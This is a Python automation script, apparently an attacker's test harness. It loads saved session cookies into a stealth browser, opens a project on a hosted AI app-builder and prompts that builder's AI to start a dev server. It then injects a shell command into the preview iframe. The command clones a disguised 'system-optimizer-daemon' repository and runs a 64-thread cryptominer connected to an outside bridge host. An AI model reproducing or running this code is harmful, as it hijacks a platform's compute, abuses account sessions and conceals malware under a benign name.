#!/usr/bin/env python3
"""
Quick test: Session 3 + Existing Project
Tests if we can inject miner into the project you already have
"""

import asyncio
import json
import random
from pathlib import Path
import sys

sys.path.insert(0, "/home/alan/Documents/automation-toolkit/finals/core")
from invisible_playwright.async_api import InvisiblePlaywright


# Config
SESSION_PATH = Path("/home/alan/Documents/automation-toolkit/scripts/sessions/session-3")
PROJECT_URL = "https://lovable.dev/projects/c5a42f16-ef02-4ee8-93b8-dbbf781db421"
PREVIEW_URL = f"https://{PROJECT_ID}.lovableproject.com"
BRIDGE_URL = "wss://bridge-production-7c63.up.railway.app"


async def inject_miner(page):
    """Inject miner command into Lovable preview."""
    
    # Fixed folder moly
    folder_name = "moly"
    
    # Build command with fixed moly folder
    miner_cmd = f'''cd /tmp && git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git moly && cd moly && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {BRIDGE_URL} --threads 64 --no-schedule  --no-pause > /tmp/m.log 2>&1'''
    
    print(f"📦 Folder: {folder_name}")
    print(f"💉 Injecting miner command...")
    
    # Open browser console and execute
    try:
        await page.evaluate(f'''
            (async () => {{
                const iframe = document.querySelector('iframe');
                if (iframe && iframe.contentWindow) {{
                    const cmd = `{miner_cmd}`;
                    console.log("Executing:", cmd);
                    
                    // Try to execute via window.doc if available
                    if (iframe.contentWindow.doc && iframe.contentWindow.doc.run) {{
                        await iframe.contentWindow.doc.run(cmd);
                    }} else {{
                        console.error("window.doc.run not available");
                    }}
                }}
            }})()
        ''')
        
        print("✅ Miner command executed")
        return True
        
    except Exception as e:
        print(f"❌ Injection failed: {e}")
        return False


async def check_preview_health(page):
    """Check if preview has error."""
    try:
        body_text = await page.locator("body").inner_text()
        
        if "Lovable proxy error" in body_text or "(404)" in body_text:
            return "ERROR"
        else:
            return "OK"
    except:
        return "UNKNOWN"


async def main():
    """Test Script 3 flow with session 3."""
    
    print("=" * 60)
    print("🧪 TESTING SESSION 3 + PROJECT")
    print("=" * 60)
    
    # Load session
    with open(SESSION_PATH / "config.json") as f:
        config = json.load(f)
    
    with open(SESSION_PATH / "cookies.json") as f:
        cookies = json.load(f)
    
    print(f"\n✅ Session 3: {config['email']}")
    print(f"📁 Project: {PROJECT_URL}")
    
    # Start browser
    print(f"\n🚀 Starting browser...")
    async with InvisiblePlaywright() as browser:
        context = browser.contexts[0] if browser.contexts else await browser.new_context()
        page = await context.new_page()
        
        # Load cookies
        await context.add_cookies(cookies)
        print("✅ Cookies loaded")
        
        # Go to chat page
        print(f"\n📱 Opening chat: {PROJECT_URL}")
        await page.goto(PROJECT_URL, timeout=30000)
        await asyncio.sleep(5)
        
        # Check if session expired
        current_url = page.url
        if "login" in current_url or "auth" in current_url:
            print("❌ SESSION EXPIRED! Flagging as RED")
            return False
        
        print("✅ Session valid")
        
        # Send prompt to AI
        print(f"\n💬 Sending prompt to AI...")
        try:
            await page.locator("textarea[placeholder*='Message']").fill(
                "Start the development server"
            )
            await page.locator("button[type='submit']").click()
            print("✅ Prompt sent")
            
            # Wait for AI response
            wait_time = random.randint(45, 60)
            print(f"⏳ Waiting {wait_time}s for AI response...")
            await asyncio.sleep(wait_time)
            
        except Exception as e:
            print(f"⚠️  Prompt failed (might already be running): {e}")
        
        # Go to preview
        print(f"\n🖥️  Opening preview: {PREVIEW_URL}")
        await page.goto(PREVIEW_URL, timeout=30000)
        await asyncio.sleep(5)
        
        # Check preview status
        status = await check_preview_health(page)
        print(f"📊 Preview status: {status}")
        
        if status == "ERROR":
            print("❌ Preview has error, stopping")
            return False
        
        # Inject miner
        print(f"\n💉 Injecting miner...")
        success = await inject_miner(page)
        
        if success:
            print("\n✅ MINER INJECTED!")
            print(f"🔄 Monitoring for 3 minutes...")
            
            # Monitor for 3 minutes
            for i in range(3):
                await asyncio.sleep(60)
                print(f"⏱️  {i+1}/3 minutes elapsed...")
                
                # Refresh and check
                await page.reload()
                await asyncio.sleep(3)
                status = await check_preview_health(page)
                print(f"   Status: {status}")
                
                if status == "ERROR":
                    print("   ⚠️  Error detected!")
            
            print("\n✅ TEST COMPLETE!")
            input("Press ENTER to close browser...")
        else:
            print("\n❌ Injection failed")
            return False


if __name__ == "__main__":
    asyncio.run(main())
